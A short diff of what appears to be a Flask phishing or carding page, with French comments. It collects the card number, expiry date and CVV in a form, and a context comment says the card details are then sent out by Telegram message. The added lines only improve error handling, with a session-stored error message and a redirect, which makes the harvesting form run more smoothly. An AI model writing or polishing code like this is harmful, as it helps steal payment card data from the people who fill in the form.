@@ -49,8 +49,10 @@ def credit_card_form():
         session['date_expiration'] = request.form.get('date_expiration', '').strip()
         session['cvv'] = request.form.get('cvv', '').strip()
 
+        # Validation + gestion d'erreur avec redirect (AJOUT)
         if not all([session['numero_carte'], session['date_expiration'], session['cvv']]):
-            return "❌ Erreur : Tous les champs de la carte sont obligatoires.", 400
+            session['error'] = "❌ Tous les champs de la carte sont obligatoires."  # Nouveau message d'erreur
+            return redirect(url_for('credit_card_form'))  # Redirection GET
 
         # Envoyer un message Telegram avec les infos de la carte
         message = f"""
@@ -71,7 +73,9 @@ def credit_card_form():
 
         return redirect(url_for('validation_paiement'))
 
-    return render_template('credit_card_form.html')
+    # Afficher l'erreur si elle existe puis la supprimer de la session (AJOUT)
+    error = session.pop('error', None)
+    return render_template('credit_card_form.html', error=error)  # Passer l'erreur au template
 
 # Route pour la page de validation de paiement
 @app.route('/validation', methods=['GET', 'POST'])
